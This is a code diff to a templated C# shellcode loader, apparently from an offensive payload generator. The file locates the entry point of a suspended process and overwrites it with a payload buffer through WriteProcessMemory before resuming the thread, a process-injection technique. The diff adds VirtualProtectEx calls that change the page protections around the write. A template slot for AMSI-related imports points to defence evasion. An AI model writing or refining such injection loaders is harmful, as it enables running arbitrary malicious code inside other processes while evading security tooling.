@@ -75,6 +75,14 @@ namespace {{ namespace }}
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+        
+        static bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect)
+        {
+            return VirtualProtectEx((IntPtr)(-1), lpAddress, dwSize, flNewProtect, out lpflOldProtect);
+        }
 {{ amsi_imports }}
 
         static void Main(string[] args)
@@ -114,9 +122,17 @@ namespace {{ namespace }}
             uint rva = BitConverter.ToUInt32(hdrBuf, (int)(lfanew + 0x28));
             IntPtr entrypoint = (IntPtr)((Int64)execAddr + rva);
 
-            // overwrite entrypoint and resume
+            // change protection to RW for writing
+            uint oldProtect;
+            VirtualProtectEx(pi.hProcess, entrypoint, (uint)buf.Length, 0x04, out oldProtect);
+
+            // overwrite entrypoint
             IntPtr nWritten = IntPtr.Zero;
             WriteProcessMemory(pi.hProcess, entrypoint, buf, buf.Length, out nWritten);
+
+            // restore protection to RX
+            VirtualProtectEx(pi.hProcess, entrypoint, (uint)buf.Length, 0x20, out oldProtect);
+
             ResumeThread(pi.hThread);
         }
     }
